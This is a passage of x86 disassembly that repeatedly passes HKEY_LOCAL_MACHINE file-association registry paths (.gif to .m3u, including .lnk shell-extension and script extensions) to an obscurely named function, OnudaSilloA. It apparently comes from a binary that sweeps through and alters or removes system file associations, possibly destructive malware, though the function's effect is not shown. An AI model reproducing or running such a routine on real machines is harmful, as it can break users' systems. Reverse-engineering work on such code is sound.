  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000168h
  push 004221B8h ; "SOFTWARE\Classes\.gif"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000169h
  push 004221E8h ; "SOFTWARE\Classes\.grp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Ah
  push 00422218h ; "SOFTWARE\Classes\.gz\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Bh
  push 0042226Ch ; "SOFTWARE\Classes\.gz"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Ch
  push 0042229Ch ; "SOFTWARE\Classes\.h\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Dh
  push 004222ECh ; "SOFTWARE\Classes\.h"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Eh
  push 00422318h ; "SOFTWARE\Classes\.hhc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000016Fh
  push 0042236Ch ; "SOFTWARE\Classes\.hhc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000170h
  push 0042239Ch ; "SOFTWARE\Classes\.hlp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000171h
  push 004223CCh ; "SOFTWARE\Classes\.hpp\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000172h
  push 0042244Ch ; "SOFTWARE\Classes\.hpp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000173h
  push 0042247Ch ; "SOFTWARE\Classes\.hqx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000174h
  push 004224D0h ; "SOFTWARE\Classes\.hqx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000175h
  push 00422500h ; "SOFTWARE\Classes\.ht"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000176h
  push 00422530h ; "SOFTWARE\Classes\.hta"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000177h
  push 00422560h ; "SOFTWARE\Classes\.htc"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000178h
  push 00422590h ; "SOFTWARE\Classes\.htm\OpenWithList\notepad.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000179h
  push 00422624h ; "SOFTWARE\Classes\.htm\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Ah
  push 00422670h ; "SOFTWARE\Classes\.htm\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Bh
  push 004226C4h ; "SOFTWARE\Classes\.htm"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Ch
  push 004226F4h ; "SOFTWARE\Classes\.html\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Dh
  push 0042274Ch ; "SOFTWARE\Classes\.html"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Eh
  push 00422780h ; "SOFTWARE\Classes\.htt\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000017Fh
  push 004227D4h ; "SOFTWARE\Classes\.htt"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000180h
  push 00422808h ; "SOFTWARE\Classes\.htw\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000181h
  push 0042285Ch ; "SOFTWARE\Classes\.htw"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000182h
  push 0042288Ch ; "SOFTWARE\Classes\.htx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000183h
  push 004228E0h ; "SOFTWARE\Classes\.htx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000184h
  push 00422910h ; "SOFTWARE\Classes\.hxx\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000185h
  push 00422964h ; "SOFTWARE\Classes\.hxx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000186h
  push 00422994h ; "SOFTWARE\Classes\.icc"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000187h
  push 004229E8h ; "SOFTWARE\Classes\.icm\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000188h
  push 00422A3Ch ; "SOFTWARE\Classes\.icm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000189h
  push 00422A6Ch ; "SOFTWARE\Classes\.ico\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Ah
  push 00422AC0h ; "SOFTWARE\Classes\.ico"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Bh
  push 00422AF0h ; "SOFTWARE\Classes\.idb\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Ch
  push 00422B44h ; "SOFTWARE\Classes\.idb"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Dh
  push 00422B74h ; "SOFTWARE\Classes\.idl\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Eh
  push 004225F4h ; "SOFTWARE\Classes\.idl"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000018Fh
  push 00422BCCh ; "SOFTWARE\Classes\.idq\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000190h
  push 00422C20h ; "SOFTWARE\Classes\.idq"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000191h
  push 00422C50h ; "SOFTWARE\Classes\.iii"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000192h
  push 00422C80h ; "SOFTWARE\Classes\.ilk\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000193h
  push 00422CD4h ; "SOFTWARE\Classes\.ilk"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000194h
  push 00422D04h ; "SOFTWARE\Classes\.imc\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000195h
  push 00422D58h ; "SOFTWARE\Classes\.imc"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000196h
  push 00422DACh ; "SOFTWARE\Classes\.in_\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000197h
  push 00422E00h ; "SOFTWARE\Classes\.in_"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000198h
  push 00422E30h ; "SOFTWARE\Classes\.inc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000199h
  push 00422E84h ; "SOFTWARE\Classes\.inc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Ah
  push 00422EB4h ; "SOFTWARE\Classes\.inf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Bh
  push 00422F08h ; "SOFTWARE\Classes\.inf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Ch
  push 00422F38h ; "SOFTWARE\Classes\.ini\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Dh
  push 00422F90h ; "SOFTWARE\Classes\.ini"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Eh
  push 00422FC0h ; "SOFTWARE\Classes\.ins"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000019Fh
  push 00422FF0h ; "SOFTWARE\Classes\.inv\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A0h
  push 00423044h ; "SOFTWARE\Classes\.inv"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A1h
  push 00423074h ; "SOFTWARE\Classes\.inx\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A2h
  push 004230C8h ; "SOFTWARE\Classes\.inx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A3h
  push 004230F8h ; "SOFTWARE\Classes\.iso"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A4h
  push 00423128h ; "SOFTWARE\Classes\.isp"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A5h
  push 0042316Ch ; "SOFTWARE\Classes\.its"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A6h
  push 0042319Ch ; "SOFTWARE\Classes\.ivf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A7h
  push 004231F0h ; "SOFTWARE\Classes\.ivf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A8h
  push 00423220h ; "SOFTWARE\Classes\.jar"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001A9h
  push 00423250h ; "SOFTWARE\Classes\.java"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001AAh
  push 00423284h ; "SOFTWARE\Classes\.jbf\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001ABh
  push 004232D8h ; "SOFTWARE\Classes\.jbf"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001ACh
  push 00423338h ; "SOFTWARE\Classes\.jfif\OpenWithProgids"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001ADh
  push 0042338Ch ; "SOFTWARE\Classes\.jfif\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001AEh
  push 004233E4h ; "SOFTWARE\Classes\.jfif"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001AFh
  push 00423418h ; "SOFTWARE\Classes\.job"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B0h
  push 00423448h ; "SOFTWARE\Classes\.jod"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B1h
  push 00423478h ; "SOFTWARE\Classes\.jpe\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B2h
  push 004234C8h ; "SOFTWARE\Classes\.jpe\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B3h
  push 00423308h ; "SOFTWARE\Classes\.jpe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B4h
  push 0042351Ch ; "SOFTWARE\Classes\.jpeg\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B5h
  push 00423570h ; "SOFTWARE\Classes\.jpeg\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B6h
  push 004235C8h ; "SOFTWARE\Classes\.jpeg"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B7h
  push 004235FCh ; "SOFTWARE\Classes\.jpg\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B8h
  push 0042364Ch ; "SOFTWARE\Classes\.jpg\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001B9h
  push 004236A0h ; "SOFTWARE\Classes\.jpg"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BAh
  push 00423700h ; "SOFTWARE\Classes\.js\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BBh
  push 00423754h ; "SOFTWARE\Classes\.js"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BCh
  push 00423784h ; "SOFTWARE\Classes\.JSE"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BDh
  push 004237B4h ; "SOFTWARE\Classes\.latex\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BEh
  push 0042380Ch ; "SOFTWARE\Classes\.latex"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001BFh
  push 00423840h ; "SOFTWARE\Classes\.lha"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C0h
  push 00423870h ; "SOFTWARE\Classes\.lib\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C1h
  push 004236D0h ; "SOFTWARE\Classes\.lib"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C2h
  push 004238E0h ; "SOFTWARE\Classes\.lnk\ShellEx\{000214EE-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C3h
  push 00423970h ; "SOFTWARE\Classes\.lnk\ShellEx\{000214F9-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C4h
  push 00423A00h ; "SOFTWARE\Classes\.lnk\ShellEx\{00021500-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C5h
  push 00423AC0h ; "SOFTWARE\Classes\.lnk\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C6h
  push 00423B50h ; "SOFTWARE\Classes\.lnk\ShellEx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C7h
  push 00423B90h ; "SOFTWARE\Classes\.lnk\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C8h
  push 00423BD4h ; "SOFTWARE\Classes\.lnk"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001C9h
  push 00423C04h ; "SOFTWARE\Classes\.local"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CAh
  push 00423C38h ; "SOFTWARE\Classes\.log\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CBh
  push 00423A90h ; "SOFTWARE\Classes\.log"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CCh
  push 00423CA4h ; "SOFTWARE\Classes\.lwv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CDh
  push 00423CD4h ; "SOFTWARE\Classes\.lzh"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CEh
  push 00423D04h ; "SOFTWARE\Classes\.m14\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001CFh
  push 00423D58h ; "SOFTWARE\Classes\.m14"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D0h
  push 00423D88h ; "SOFTWARE\Classes\.m1v\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D1h
  push 00423DECh ; "SOFTWARE\Classes\.m1v\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D2h
  push 00423E38h ; "SOFTWARE\Classes\.m1v\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D3h
  push 00423E88h ; "SOFTWARE\Classes\.m1v\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D4h
  push 00423EDCh ; "SOFTWARE\Classes\.m1v"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D5h
  push 00423F0Ch ; "SOFTWARE\Classes\.m3u\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D6h
  push 00423F70h ; "SOFTWARE\Classes\.m3u\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
